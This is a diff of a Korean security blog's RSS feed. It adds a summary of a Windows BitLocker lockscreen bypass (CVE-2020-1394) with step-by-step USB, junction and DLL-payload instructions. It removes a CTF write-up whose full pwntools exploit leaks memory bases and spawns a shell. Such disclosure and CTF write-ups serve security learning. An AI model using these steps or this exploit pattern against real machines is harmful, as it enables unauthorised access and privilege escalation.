@@ -9,8 +9,42 @@
     <atom:link href="https://hackyboiz.github.io/rss2.xml" rel="self" type="application/rss+xml"/>
     
     <description>hack &amp; life</description>
-    <pubDate>Sun, 17 Jan 2021 06:49:07 GMT</pubDate>
+    <pubDate>Mon, 18 Jan 2021 08:56:29 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>[하루한줄] CVE-2020-1394 : Windows LockScreen Escalation of Privilege</title>
+      <link>https://hackyboiz.github.io/2021/01/18/idioth/2021-01-18/</link>
+      <guid>https://hackyboiz.github.io/2021/01/18/idioth/2021-01-18/</guid>
+      <pubDate>Mon, 18 Jan 2021 09:00:00 GMT</pubDate>
+      
+        
+        
+      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://secret.club/2021/01/15/bitlocker-bypass.html&quot;&gt;Bit</description>
+        
+      
+      
+      
+      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://secret.club/2021/01/15/bitlocker-bypass.html">BitLocker Lockscreen bypass</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Windows BitLocker Lockscreen 우회를 통한 권한 상승 취약점에 대한 세부 사항이 공개되었습니다. BitLocker는 Windows에서 지원하는 디스크 암호화 기능으로 볼륨 전체에 암호화를 제공하여 자료를 보호하도록 설계된 기능입니다. 하지만 다음과 같은 방법으로 관리자 계정을 추가하여 BitLocker를 우회할 수 있습니다.</p><ol><li>로그인 화면에서 “암호를 잊어버렸습니다.”를 선택합니다.</li><li>잠금 우회 후 이동식 드라이브의 자동 실행을 활성화합니다.</li><li>exe 파일과 junction folder가 있는 USB를 삽입합니다.</li><li>실행 파일이 실행되면 USB를 제거한 후 다시 삽입하고 메인 화면으로 돌아갑니다.</li><li>내레이터가 시작되면 설치된 DLL 페이로드가 실행됩니다.</li></ol><p>위의 작업을 수행하기 위해 LockScreen을 우회하는 방법은 다음과 같습니다.</p><ol><li>“암호/PIN을 잊어버렸습니다.”를 선택합니다. </li><li>화면을 볼 수 없으므로 내레이터를 사용하여 탐색을 진행합니다.</li><li>shift 키를 5번 연속으로 누르면, 설정 창을 여는 링크가 있는 창이 뜹니다.</li><li>링크를 클릭해도 시작된 설정 창은 볼 수 없으므로 링크를 1초에 2번 정도 계속 클릭합니다.</li><li>화면에 focus box가 나타나면 해당 창은 설정 창이므로 CapsLock + 왼쪽 화살표를 통해 홈으로 이동합니다.</li><li>CapsLock + 방향키를 통해 장치 - 자동 실행 - 이동식 드라이브 - 폴더를 열어 파일 보기(파일 탐색기)를 선택합니다.</li></ol><p>이후 USB 연결 후 내레이터가 창이 떴다고 했을 때 Exploit.exe 파일을 실행하면 암호를 사용하지 않고 실행이 가능합니다.</p><p>USB가 마운트 될 때 BitLocker는 시스템 볼륨 정보에 <code>ClientRecoveryPasswordRotation</code>이라는 디렉터리를 생성하고 <code>Authenticated Users: (F), SYSTEM: (I) (OI) (CI) (F)</code> 권한을 부여합니다. 디렉터리 생성 작업을 리다이렉트 하기 위해 USB를 사용하여 <code>\System Volume Information</code>을 <code>\RCP Control</code>로 향하는 마운트 포인트로 만듭니다. 그 후 <code>\RPC Control\ClientRecoveryPasswordRoation</code>에 <code>\??\C:\Windows\system32\Narrator.exe.local</code>에 대한 심볼릭 링크를 생성합니다. USB를 다시 삽입하면, <code>C:\Windows\System32\Narrator.exe.locl</code> 폴더는 하위 디렉터리를 생성할 수 있는 권한으로 생성됩니다. 이 하위 디렉터리에 DLL 페이로드를 넣은 후 내레이터가 시작되면, DLL 페이로드가 실행됩니다.</p>]]></content:encoded>
+      
+      
+      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
+      
+      
+      <category domain="https://hackyboiz.github.io/tags/cve/">cve</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/eop/">eop</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/lockscreen/">lockscreen</category>
+      
+      
+      <comments>https://hackyboiz.github.io/2021/01/18/idioth/2021-01-18/#disqus_thread</comments>
+      
+    </item>
     
     <item>
       <title>[Translation] R.I.P ROP: CET Internals in Windows 20H1</title>
@@ -138,9 +172,9 @@
       
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
-      <category domain="https://hackyboiz.github.io/tags/arbitrary-read/">arbitrary read</category>
-      
       <category domain="https://hackyboiz.github.io/tags/splwow64/">splwow64</category>
+      
+      <category domain="https://hackyboiz.github.io/tags/arbitrary-read/">arbitrary read</category>
       
       
       <comments>https://hackyboiz.github.io/2021/01/14/idioth/2021-01-14/#disqus_thread</comments>
@@ -269,13 +303,13 @@
       <category domain="https://hackyboiz.github.io/categories/Translation/">Translation</category>
       
       
+      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
+      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/memfuck/">memfuck</category>
       
       <category domain="https://hackyboiz.github.io/tags/hook/">hook</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
       
       
       <comments>https://hackyboiz.github.io/2021/01/10/idioth/memfuck/#disqus_thread</comments>
@@ -503,11 +537,11 @@
       
       <category domain="https://hackyboiz.github.io/tags/ctf/">ctf</category>
       
+      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
+      
       <category domain="https://hackyboiz.github.io/tags/idioth/">idioth</category>
       
       <category domain="https://hackyboiz.github.io/tags/christmas-ctf-2020/">christmas ctf 2020</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
       
       <category domain="https://hackyboiz.github.io/tags/review/">review</category>
       
@@ -649,41 +683,6 @@
       
       
       <comments>https://hackyboiz.github.io/2020/12/30/fabu1ous/2020-12-30/#disqus_thread</comments>
-      
-    </item>
-    
-    <item>
-      <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
-      <link>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</link>
-      <guid>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/</guid>
-      <pubDate>Tue, 29 Dec 2020 12:00:00 GMT</pubDate>
-      
-        
-        
-      <description>&lt;h1 id=&quot;문제-개요&quot;&gt;&lt;a href=&quot;#문제-개요&quot; class=&quot;headerlink&quot; title=&quot;문제 개요&quot;&gt;&lt;/a&gt;문제 개요&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/2020/12/29/fabu1ous/match-maker/1.png&quot;&gt;&lt;/p&gt;
-&lt;ol</description>
-        
-      
-      
-      
-      <content:encoded><![CDATA[<h1 id="문제-개요"><a href="#문제-개요" class="headerlink" title="문제 개요"></a>문제 개요</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png"></p><ol><li><p>프로필을 만듭니다.</p><ul><li>이름, 나이, 성별, 취미를 입력</li><li>나이 정보에 따라 파트너 매칭 함수가 달라짐</li></ul></li><li><p>만든 프로필을 저장합니다.</p><ul><li>만들어진 프로필을 힙에 저장</li><li>성별을 구분하여 전역 배열에 힙 주소 저장.</li></ul></li><li><p>파트너 매칭을 합니다.</p></li><li><p>매칭 된 파트너의 정보를 출력합니다.</p></li><li><p>유저 리스트를 출력합니다.</p><ul><li>현재 프로필이 남자면 여자 리스트를 출력</li><li>현재 프로필이 여자면 남자 리스트를 출력</li></ul></li></ol><h1 id="풀이-요약"><a href="#풀이-요약" class="headerlink" title="풀이 요약"></a>풀이 요약</h1><p>find match 기능에서 사용할 알고리즘을 정하는 로직이 존재합니다. pref_min_age != pref_max_age이면서 pref_min_age ^ 2 == pref_max_age ^ 2 일 때 초기화되지 않은 스택의 쓰레기 값으로 rip를 조작할 수 있습니다. int-overflow를 활용하면 됩니다.</p><p>show user list 기능에서 user list를 참조할 때 sex ^1을 index로 사용합니다. 프로필 작성 시 성별 입력값에 제한이 없기 때문에 이를 이용해 바이너리 base주소와 libc base 주소를 얻을 수 있습니다.</p><h1 id="취약점"><a href="#취약점" class="headerlink" title="취약점"></a>취약점</h1><ul><li>int overflow → uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png"></p><p>프로필 생성 메뉴에서 입력받은 나이 정보를 토대로 파트너 매칭 루틴을 정하는 코드입니다. if…else가 아닌 if…if 이므로 integer overflow를 발생시켜 <code>(void*)func()</code>의 값을 스택에 있던 쓰레기 값으로 설정할 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png"></p><p>연상 혹은 연하 중 선호하는 쪽을 계산하는 루틴에서 절댓값을 사용합니다. 입력할 수 있는 나이에 최댓값 제한이 없기 때문에 int overflow를 발생시켜 스택 변수 <code>(void*)func()를</code> 초기화하는 작업을 건너뛸 수 있습니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png"></p><p><code>(void*)func()</code>값에 영향을 미치는 쓰레기 값은 name을 입력받을 때 사용하던 버퍼입니다.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png"></p><p>메인 메뉴에서 find match를 선택하면 rip가 잡히는 것을 확인할 수 있습니다.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png"></p><p>성별은 int로 입력받습니다.</p><p>0 : 남자</p><p>1 : 여자</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png"></p><p>현재 프로필이 남자면 여자 유저 리스트를, 여자면 남자 리스트를 출력해주는 함수입니다. 0도 1도 아닌 다른 값을 성별로 입력하면 oob-read가 가능합니다. binary의 base주소, libc의 base주소를 leak 할 수 있습니다.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&#x27;./match&#x27;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&#x27;debug&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;age: &#x27;</span>, age)p.sendlineafter(<span class="hljs-string">&#x27;name: &#x27;</span>, name)p.sendlineafter(<span class="hljs-string">&#x27;min age limit for you: &#x27;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&#x27;max age limit for you: &#x27;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, sex)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 1 : &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 2 : &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)p.sendlineafter(<span class="hljs-string">&#x27;enter hobby 3 : &#x27;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&#x27;&gt; &#x27;</span>, <span class="hljs-string">&#x27;4&#x27;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;A&#x27;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&#x27;BBBBBBBB&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;-2&#x27;</span>)showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&#x27;65536&#x27;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&#x27;BBBBBBBBCCCCCCCC&#x27;</span>, <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)save()showL()p.recvuntil(<span class="hljs-string">&#x27;[potential partners]\\n0. &#x27;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&#x27;\\x00\\x00&#x27;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&#x27;65536&#x27;</span>, <span class="hljs-string">b&#x27;/bin/sh;&#x27;</span>+<span class="hljs-string">b&#x27;B&#x27;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;196608&#x27;</span>, <span class="hljs-string">&#x27;23&#x27;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS&#123;1_d0n7_w4nna_kn0w_who&#39;5_tak1ng_U_h0me&#125;</code></pre>]]></content:encoded>
-      
-      
-      <category domain="https://hackyboiz.github.io/categories/Write-Up/">Write-Up</category>
-      
-      
-      <category domain="https://hackyboiz.github.io/tags/Fabu1ous/">Fabu1ous</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/pwnable/">pwnable</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/oob/">oob</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/uninitialized-stack/">uninitialized stack</category>
-      
-      <category domain="https://hackyboiz.github.io/tags/integer-overflow/">integer overflow</category>
-      
-      
-      <comments>https://hackyboiz.github.io/2020/12/29/fabu1ous/match-maker/#disqus_thread</comments>
       
     </item>
     
